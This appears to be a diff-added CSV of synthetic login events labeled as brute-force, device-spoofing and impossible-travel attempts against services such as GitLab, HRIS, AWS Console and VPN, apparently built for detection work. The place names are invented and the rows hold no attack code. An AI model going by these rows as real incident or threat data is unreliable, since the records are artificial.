+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:14:12,197.130.46.119,"New Christophershire, Qatar",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:15,159.196.24.25,"South Isaiahfurt, Somalia",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:15,159.196.24.25,"New Amber, Cape Verde",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:17,159.196.24.25,"Glenfurt, Poland",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:14:18,197.130.46.119,"Tonystad, Yemen",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:21,159.196.24.25,"Lake Regina, United Kingdom",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:14:21,197.130.46.119,"New Ethanfurt, Heard Island and McDonald Islands",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:14:22,197.130.46.119,"Port Tanyamouth, Holy See (Vatican City State)",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:23,159.196.24.25,"Deannafurt, San Marino",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:26,159.196.24.25,"Marshallborough, Cook Islands",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:29,159.196.24.25,"West Ashleybury, Belarus",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:30,159.196.24.25,"Brewerbury, New Zealand",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:14:31,197.130.46.119,"Smithfort, Korea",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:14:32,197.130.46.119,"New Duanefort, Kyrgyz Republic",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:33,159.196.24.25,"South Biancaland, American Samoa",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:35,159.196.24.25,"Montgomeryton, Guinea",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:14:38,197.130.46.119,"Angelashire, British Indian Ocean Territory (Chagos Archipelago)",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:40,159.196.24.25,"Marcusfort, Pakistan",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:14:42,197.130.46.119,"Torreston, Mozambique",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:14:46,197.130.46.119,"New Sherimouth, Congo",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:14:46,197.130.46.119,"Velasquezland, Honduras",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:53,159.196.24.25,"Lake Wyattville, Djibouti",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:14:54,197.130.46.119,"Robinsonstad, Madagascar",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:55,159.196.24.25,"West Ryan, Lesotho",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:14:57,197.130.46.119,"West Julieshire, Congo",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:59,159.196.24.25,"Thomasburgh, South Africa",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:15:03,197.130.46.119,"Wilsonmouth, Georgia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:15:08,159.196.24.25,"West Deannahaven, Puerto Rico",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:15:10,159.196.24.25,"North Tracy, Heard Island and McDonald Islands",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:15:14,159.196.24.25,"Lake Robert, French Guiana",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:15:26,197.130.46.119,"Valentinefort, Burkina Faso",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:15:30,197.130.46.119,"Williammouth, Belize",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:15:33,197.130.46.119,"Kaylatown, Burundi",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:15:38,197.130.46.119,"Leeshire, Japan",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:15:38,159.196.24.25,"Lisamouth, Cayman Islands",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:15:40,159.196.24.25,"Wagnermouth, Antarctica (the territory South of 60 deg S)",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:15:43,159.196.24.25,"Lake Lynn, Panama",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:15:46,197.130.46.119,"East Laurieville, Mozambique",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:15:50,197.130.46.119,"East Craig, Guatemala",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:15:50,159.196.24.25,"New Ryanview, Saint Pierre and Miquelon",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:15:54,197.130.46.119,"Elizabethhaven, El Salvador",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:16:01,197.130.46.119,"North Robert, Mayotte",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:16:05,159.196.24.25,"Melindahaven, Netherlands Antilles",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:16:10,197.130.46.119,"South Michael, Bhutan",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:16:14,197.130.46.119,"North Sophiashire, Pitcairn Islands",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:16:25,159.196.24.25,"South Cameron, Armenia",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:16:40,159.196.24.25,"Leefort, Brazil",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:16:45,159.196.24.25,"Michelleland, Angola",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:16:50,159.196.24.25,"West Bryanside, Syrian Arab Republic",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b0ff39-de69-4e42-a7c4-fae9a84d3d7e,Device,2026-06-26 08:30:37,115.144.110.21,"Richardmouth, Australia",Jira,Password,1752,N/A,Android 14 - Curl - MAC: 02:c7:a9:d4:83:d9,True,Device Spoofing
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:34:30,216.46.61.244,"West Katie, Western Sahara",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:34:34,216.46.61.244,"West Lindsaymouth, Papua New Guinea",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:34:35,216.46.61.244,"East Brandon, Benin",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:34:37,216.46.61.244,"North Nicoleborough, Malawi",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:34:40,216.46.61.244,"West Lorettaview, Albania",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:34:42,216.46.61.244,"East Erin, Colombia",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:34:42,216.46.61.244,"Sullivanport, Iran",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:34:43,216.46.61.244,"Lake Lisa, Timor-Leste",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:34:44,216.46.61.244,"North Vanessaton, Qatar",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:34:45,216.46.61.244,"West Andrea, Hong Kong",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:34:46,216.46.61.244,"Lake Timothymouth, Timor-Leste",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:34:48,216.46.61.244,"Elizabethmouth, El Salvador",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:34:48,216.46.61.244,"New Laura, Sri Lanka",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:34:49,216.46.61.244,"Lewisfort, Cape Verde",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:34:52,216.46.61.244,"Patriciaside, Italy",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:34:54,216.46.61.244,"Robertburgh, Australia",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:35:00,216.46.61.244,"South Williamfort, Christmas Island",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:35:10,216.46.61.244,"West Andreabury, Niger",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:35:21,216.46.61.244,"Lake Micheal, Pakistan",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:35:22,216.46.61.244,"Wesleyfurt, Maldives",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:35:28,216.46.61.244,"West Jimmytown, Nigeria",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:35:30,216.46.61.244,"Susanside, Cayman Islands",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:35:33,216.46.61.244,"Christinaview, Afghanistan",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:35:34,216.46.61.244,"Duncanville, Cook Islands",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:35:50,216.46.61.244,"Mitchellville, Guam",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:35:51,216.46.61.244,"North Destiny, Micronesia",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:36:20,216.46.61.244,"Simmonsbury, Belgium",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:36:22,216.46.61.244,"Justinfurt, Tanzania",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:36:25,216.46.61.244,"Lindamouth, South Africa",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:36:30,216.46.61.244,"Lake Melissaburgh, Grenada",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+fc002d59-4b24-49fe-a21a-06c7cce9c5b9,User,2026-06-26 08:36:35,216.46.61.244,"Bellland, Dominican Republic",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:54:47,166.216.80.231,"New Kevin, Panama",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:54:48,166.216.80.231,"Phillipsshire, Tonga",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:54:51,166.216.80.231,"New Timothy, Philippines",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:54:52,166.216.80.231,"North Sherryside, British Indian Ocean Territory (Chagos Archipelago)",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:54:54,166.216.80.231,"Moorechester, India",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:54:55,166.216.80.231,"Blevinsfort, Saint Helena",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:54:59,166.216.80.231,"Landryfurt, Pakistan",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:02,166.216.80.231,"North Glennhaven, Morocco",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:05,166.216.80.231,"Williamsview, Bosnia and Herzegovina",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:05,161.42.36.25,"Riggsburgh, British Indian Ocean Territory (Chagos Archipelago)",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:06,161.42.36.25,"Amberhaven, San Marino",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:09,166.216.80.231,"Lake Patricia, Guadeloupe",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:11,166.216.80.231,"Davidhaven, Niger",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:13,166.216.80.231,"Lisachester, Montenegro",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:13,166.216.80.231,"West Shelly, Bermuda",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:15,161.42.36.25,"Millerview, Belarus",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:15,166.216.80.231,"East Elizabethhaven, Barbados",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:15,161.42.36.25,"Paulland, Namibia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:16,166.216.80.231,"Jeffreybury, French Polynesia",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:17,161.42.36.25,"North Colinhaven, Nicaragua",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:17,161.42.36.25,"New Cassandraside, Belize",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:18,166.216.80.231,"North Crystal, Cyprus",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:19,161.42.36.25,"Smithview, United Arab Emirates",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:20,161.42.36.25,"North Daniel, Uganda",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:23,161.42.36.25,"West Crystal, Albania",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:23,166.216.80.231,"New Allen, Chile",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:25,161.42.36.25,"Lake Kellyshire, Equatorial Guinea",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:26,161.42.36.25,"North Beth, Israel",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:27,161.42.36.25,"Williamsland, Mauritius",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:29,161.42.36.25,"Katherinemouth, Angola",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:31,166.216.80.231,"Martinezmouth, Antigua and Barbuda",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:32,166.216.80.231,"Doughertyland, Micronesia",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:35,161.42.36.25,"Jasonmouth, Finland",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:37,166.216.80.231,"Port Kristimouth, Ghana",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:37,166.216.80.231,"Fowlerstad, Tuvalu",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:37,161.42.36.25,"Lake Linda, United Arab Emirates",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:41,166.216.80.231,"Sarahaven, Brazil",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:43,166.216.80.231,"Emilyland, Heard Island and McDonald Islands",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:47,161.42.36.25,"North Vincent, Argentina",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:50,161.42.36.25,"North Michaeltown, Sao Tome and Principe",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:51,166.216.80.231,"Port Christyton, Angola",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:53,161.42.36.25,"North Raymond, Svalbard & Jan Mayen Islands",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:56,161.42.36.25,"East Timothy, Singapore",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:57,161.42.36.25,"East Jeremy, Indonesia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:59,166.216.80.231,"Linhaven, Dominican Republic",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:56:05,161.42.36.25,"Hernandezhaven, Puerto Rico",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:56:11,161.42.36.25,"East Mauricemouth, Tonga",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:56:12,166.216.80.231,"Leslieborough, Turkey",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:56:17,166.216.80.231,"Scotthaven, Saint Martin",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:56:21,161.42.36.25,"Andrewmouth, Haiti",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:56:22,166.216.80.231,"Port Matthewfort, Greenland",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:56:23,161.42.36.25,"Lake Amandaburgh, Timor-Leste",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:56:25,161.42.36.25,"Seanland, Albania",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:56:27,166.216.80.231,"Woodwardton, Lebanon",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:56:29,161.42.36.25,"North Michelle, Puerto Rico",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:56:32,161.42.36.25,"Smithside, Benin",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:56:32,166.216.80.231,"Benjamintown, Zimbabwe",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:56:38,161.42.36.25,"Elizabethhaven, Azerbaijan",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:56:42,166.216.80.231,"Johnmouth, Saudi Arabia",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:56:59,166.216.80.231,"North Hannah, Peru",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:57:00,161.42.36.25,"West William, Heard Island and McDonald Islands",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:57:10,161.42.36.25,"Schmidtburgh, Saint Barthelemy",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:57:13,161.42.36.25,"Georgeland, Northern Mariana Islands",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:57:17,166.216.80.231,"Bethburgh, Germany",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:57:20,161.42.36.25,"Mitchellburgh, Guyana",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:57:27,166.216.80.231,"Lake Crystal, Korea",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:57:35,161.42.36.25,"South John, Latvia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 09:59:44,119.181.32.98,"New Eric, Congo",GitLab,SSO,473,N/A,Unknown Browser/Device,True,Impossible Travel
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:05,68.74.121.87,"Dawnside, Guernsey",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
